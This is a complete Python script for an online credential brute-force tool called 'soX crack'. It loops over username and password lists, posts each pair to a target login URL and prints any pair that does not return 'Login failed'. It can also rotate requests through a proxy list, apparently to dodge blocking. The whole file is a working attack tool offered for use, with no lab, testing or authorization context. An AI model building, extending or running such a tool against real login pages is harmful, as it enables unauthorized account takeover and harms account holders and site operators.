import argparse
import requests
import sys


RED = '\033[31m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_banner():
    print(f"{RED}{BOLD}")
    print(r"""
              __   
          \ \ / /
  ___  ___ \ V / 
 / __|/ _ \ > <          -_-
 \__ \ (_) / . \         mr.robot
 |___/\___/_/ \_\
   
    [ soX crack v1.3 ]
    """)
    print(f"{RESET} [ soX crack - Brute Force Tool ]\n")

def load_file(filepath):
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Error: File {filepath} not found.{RESET}")
        sys.exit(1)

def brute_force(url, users, passwords, proxies=None):
    print(f"{RED}[*] Starting attack on: {url}{RESET}\n")
    

    proxy_dict = {}
    if proxies:
        print(f"{RED}[*] Using {len(proxies)} proxies...{RESET}")


        proxy_list = proxies
    else:
        proxy_list = None

    for user in users:
        for password in passwords:

            current_proxy = None
            if proxy_list:

                p = proxy_list[users.index(user) % len(proxy_list)]
                current_proxy = {"http": p, "https": p}



            data = {
                'username': user,
                'password': password
            }

            try:
                response = requests.post(url, data=data, proxies=current_proxy, timeout=5)
                


                if "Login failed" not in response.text and response.status_code == 200:
                    print(f"\n{RED}[+] SUCCESS!{RESET}")
                    print(f"{RED}[+] Username: {user}{RESET}")
                    print(f"{RED}[+] Password: {password}{RESET}")
                    return
                else:
                    print(f"{RED}[-] Attempt: {user}:{password} -> Failed{RESET}", end='\r')

            except Exception as e:
                print(f"\n{RED}[!] Error connecting: {e}{RESET}")
                continue

    print(f"\n\n{RED}[!] Attack finished. No valid credentials found.{RESET}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="soX crack - Brute Force Tool")
    

    parser.add_argument("-u", "--url", required=True, help="Target login URL")
    parser.add_argument("-l", "--userlist", required=True, help="Path to username list")
    parser.add_argument("-p", "--passlist", required=True, help="Path to password list")
    parser.add_argument("-x", "--proxylist", help="Path to proxy list (optional)")

    args = parser.parse_args()


    users = load_file(args.userlist)
    passwords = load_file(args.passlist)
    proxies = load_file(args.proxylist) if args.proxylist else None


    brute_force(args.url, users, passwords, proxies)

if __name__ == "__main__":
    main()
          
